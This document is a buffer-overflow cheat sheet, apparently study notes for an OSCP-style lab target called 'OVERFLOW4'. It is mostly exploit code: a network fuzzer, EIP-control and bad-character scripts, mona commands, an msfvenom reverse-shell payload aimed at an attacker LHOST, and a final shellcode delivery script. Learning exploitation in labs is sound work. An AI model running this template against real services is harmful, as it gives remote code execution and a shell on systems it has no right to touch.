# Windows

## Summary of steps

### Fuzz

```python
# Fuzzing

# Run the fuzzer and make note of the length

import socket, time, sys

ip = "change this"
port = change this
timeout = 5
command = "OVERFLOW4 "

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send(command + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

### Crash / Control EIP

```bash
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length from fuzzing + 400>
```

```python
# Paste the output of the above command into payload

import socket

ip = "10.10.44.88"
port = 1337

prefix = "OVERFLOW4 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "<OUTPUT FROM pattern_create.rb>"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

```
# Run the script
```

```python
# This command in Immunity will have output like:
# EIP contains normal pattern ...
# Make note of the offset number output from this command in immunity
# Run this command after the program has crashed from script above

!mona findmsp -distance <fuzzing length + 400>
```

```python
From the "!mona findmsp" command OUTPUT, make note of the EIP offset
```

```python
# Update the script and remove payload
# Add offset from !mona findmsp command output
# Make retn = "BBBB"
# Run
# The crash should result in EIP being set to "42424242"

import socket

ip = "10.10.44.88"
port = 1337

prefix = "OVERFLOW4 "
offset = '<offset here from !mona findmsp command>'
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

### Finding Bad Characters

```python
# Set working directory

!mona config -set workingfolder <path to wherever the fuck you want>

# Generate a byte array, will output to directory you put above. ^^

!mona bytearray -b "\x00"
```

#### Generate bad chars list 0x01 - 0xff

```python
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()
```

```python
# Update the script payload with the badchars list
# Run the script
# Make note of ESP when the program crashes

import socket

ip = "10.10.44.88"
port = 1337

prefix = "OVERFLOW4 "
offset = '<offset here from !mona findmsp command>'
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

```python
# Address from ESP from crashed program from above script
!mona compare -f C:\mona\oscp\bytearray.bin -a 0x<address>

# Make note of all the bad chars from this output
# Remove all the bad chars from the above script then generate
# a new byte array "!mona bytearray -b "\x00....\xff" with all the badchars found
# Rinse and repeat until no badchars remain
```

### Find JMP

```python
# Keep in mind you may also need to find JMP ESP from a .dll instead of the exe
# To find this address, follow your OSCP guide...im too lazy to write this

!mona jmp -r esp -cpb "<badchars>"

# Pick an address from the output

# Update the script with the address in "retn" variable

# Generate payload

msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py

# update the script

# start listener

# nc -lnvp 4444 (or whatever your payload was set to)
------------------------------

import socket

ip = "10.10.44.88"
port = 1337

cmd = "OVERFLOW4 "
offset = '<offset here from !mona findmsp command>'
overflow = "A" * offset
retn = "<address here>"
padding = "\x90" * 16
payload = ""
postfix = ""

# Paste payload here
# buf
# buf ..
# buf ...

buffer = cmd + overflow + retn + padding + buf + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

